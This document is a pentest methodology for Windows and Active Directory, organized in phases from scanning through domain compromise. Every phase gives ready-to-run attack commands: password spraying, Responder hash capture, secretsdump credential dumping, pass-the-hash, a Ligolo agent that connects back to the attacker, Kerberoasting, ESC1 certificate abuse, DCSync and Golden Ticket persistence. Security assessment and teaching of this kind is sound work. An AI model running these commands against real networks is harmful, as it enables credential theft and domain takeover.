# Windows & Active Directory Penetration Testing Methodology

This methodology outlines a comprehensive workflow for assessing Windows environments, ranging from standalone workstations to complex Active Directory domain networks. The steps are generalized but contain specific branches depending on whether the target is a standalone machine or part of a domain.

---

## Phase 1: Initial Reconnaissance & Enumeration (All Machines)

**Goal:** Identify exposed services, operating system versions, and potential entry points.

### 1. Port Scanning & Service Fingerprinting
```bash
# Fast all-ports scan
nmap -p- --min-rate 5000 <IP>

# Detailed service and script scan on open ports
nmap -p <OPEN_PORTS> -sC -sV <IP>
```

### 2. SMB & RPC Enumeration
```bash
# Check for anonymous/null session SMB access
netexec smb <IP> -u '' -p '' --shares

# Enumerate RPC (look for users, groups, domains)
rpcclient -U "" -N <IP>
```

---

## Phase 2: Initial Access & Foothold

**Goal:** Gain the first set of credentials, a hash, or remote code execution on the system.

### Option A: External Domain Attacks (No prior credentials)
```bash
# AS-REP Roasting (Extract hashes for accounts with "Do not require Kerberos preauthentication" set)
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -request -format hashcat

# Password Spraying (If user list is obtained)
netexec smb <IP> -u users.txt -p 'Spring2024!' --continue-on-success
```

### Option B: Network Poisoning (Local Network)
Coerce the network to send you NetNTLMv1/v2 hashes.
```bash
# Start Responder to listen for LLMNR/NBT-NS/mDNS poisoning
sudo responder -I tun0 -rdw

# Crack caught hashes
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Option C: Service Exploitation
- Exploit vulnerable web applications hosted on IIS.
- Exploit known CVEs in services like SMB (EternalBlue), RDP (BlueKeep), or third-party apps.

---

## Phase 3: Local Privilege Escalation (Standalone & Domain-Joined)

**Goal:** Elevate from a standard user to `NT AUTHORITY\SYSTEM` or Local Administrator.

### 1. Automated Enumeration
Upload and run enumeration scripts to find misconfigurations.
```powershell
.\winPEASany.exe
.\Seatbelt.exe -group=all
```

### 2. Common PrivEsc Vectors
- **Token Privileges:** Check `whoami /priv`. Look for `SeImpersonatePrivilege` (use PrintSpoofer or GodPotato) or `SeBackupPrivilege`.
- **Service Misconfigurations:** Unquoted Service Paths, Weak Service Permissions (Modifiable Binaries).
- **Scheduled Tasks:** Check for custom tasks running as SYSTEM that modify writable files.
- **Stored Credentials:**
  - Check Windows Vault / Credential Manager.
  - Search registry for `DefaultPassword` (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`).
  - Extract browser passwords or configuration files.

### 3. Dumping Local Hashes (Requires Local Admin)
```bash
# Dump SAM and LSA secrets via impacket
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

---

## Phase 4: Active Directory Enumeration (Domain-Joined)

**Goal:** Map the domain to find escalation paths and misconfigurations.

### 1. BloodHound Data Collection
```bash
# From Linux (Python)
bloodhound-python -u '<USER>' -p '<PASSWORD>' -ns <DC_IP> -d <DOMAIN> -c all

# From Windows (C#)
.\SharpHound.exe -c All
```

### 2. Manual AD Enumeration
```bash
# Enumerate Users and Groups via LDAP
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --users
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --groups
```

---

## Phase 5: Lateral Movement & Pivoting

**Goal:** Move horizontally across the network to find higher-privileged users or access isolated subnets.

### 1. Lateral Movement Execution
```bash
# Pass the Hash / Password via WinRM
evil-winrm -i <IP> -u '<USER>' -p '<PASSWORD_OR_NT_HASH>'

# SMBExec / WMIExec (Requires Local Admin on target)
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

### 2. Pivoting into Internal Subnets
**Ligolo-ng (Route-based):**
```bash
# On Kali: Start proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On Target: Connect back
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

---

## Phase 6: Domain Privilege Escalation

**Goal:** Exploit domain misconfigurations to compromise a Domain Admin or the Domain Controller.

### Option A: Kerberoasting
Find service accounts with SPNs and crack their tickets.
```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request
```

### Option B: Abusing ACLs (Found via BloodHound)
If you have `GenericWrite` or `WriteProperty` over an object:
- **Targeted Kerberoasting:** Write a fake SPN to an account, then Kerberoast it.
- **Shadow Credentials:** Write a Key Credential Link to impersonate the user.
```bash
certipy-ad shadow auto -u '<USER>' -p '<PASSWORD>' -account '<TARGET_ACCOUNT>' -dc-ip <DC_IP>
```

### Option C: AD CS (Active Directory Certificate Services) Vulnerabilities
Look for vulnerable certificate templates (e.g., ESC1, ESC8).
```bash
# Find vulnerable templates
certipy-ad find -u '<USER>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout

# Exploit ESC1 (Request cert as Administrator)
certipy-ad req -u '<USER>' -p '<PASSWORD>' -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@<DOMAIN> -target <DC_IP>

# Authenticate with Cert
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

---

## Phase 7: Domain Compromise & Secrets Extraction

**Goal:** Extract the NTDS.dit file (Active Directory database) and ensure persistent access.

### 1. DCSync Attack
Simulate a Domain Controller to extract all Active Directory hashes (Requires Domain Admin or DCSync rights).
```bash
impacket-secretsdump <DOMAIN>/administrator@<DC_IP> -hashes :<NT_HASH_ONLY>
```

### 2. Establish Persistence
- **Golden Ticket:** Forge a Kerberos Ticket-Granting Ticket (TGT) using the `krbtgt` hash.
- **DSRM Password:** Reset the Directory Services Restore Mode password for persistence if normal Admin hashes are changed.
